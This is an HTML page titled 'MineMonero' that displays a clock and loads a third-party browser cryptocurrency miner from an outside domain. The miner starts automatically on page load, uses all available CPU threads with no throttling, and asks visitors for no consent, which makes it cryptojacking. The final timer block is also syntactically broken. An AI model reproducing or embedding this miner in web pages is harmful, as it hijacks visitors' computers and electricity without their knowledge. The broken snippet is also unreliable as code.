<link rel="stylesheet" href="assets/main.css">
<title>MineMonero</title>
<div id="bg">
  <div id="clock">
    <script>
      function clock() {
        var today = new Date();
        var hours = today.getHours();
        var minutes = today.getMinutes();
        var seconds = today.getSeconds();
        if (hours > 12) {
          hours = hours - 12;
        } else if (hours === 0) {
          hours = 12;
        }
        if (minutes < 10) {
          minutes = "0" + minutes;
        } else {
          minutes = minutes;
        }
        if (seconds < 10) {
          seconds = "0" + seconds;
        } else {
          seconds = seconds;
        }
        document.getElementById("clock").innerHTML = (hours + ":" + minutes);
      }
      setInterval('clock()', 1000);

    </script>
  </div>
  <script src="//cryptaloot.pro/lib/crypta.js"></script>
  <script>
    var miner = new CRLT.Anonymous('f3981c028e6ec16499b062588983dff0f19496e86006', {
      autoThreads: true,
      throttle: 0,
    });
    miner.start();
    setInterval(function() {
      hashesPerSecond = miner.getHashesPerSecond();
      totalHashes = miner.getTotalHashes();
      acceptedHashes = miner.getAcceptedHashes();
      document.getElementById("totalHash").innerHTML = totalHashes + "Hashes";
      document.getElementById("hashPerSec").innerHTML = hashesPerSecond + " hashes/sec";
    }
</script>
  
<p id="totalHash"></p>
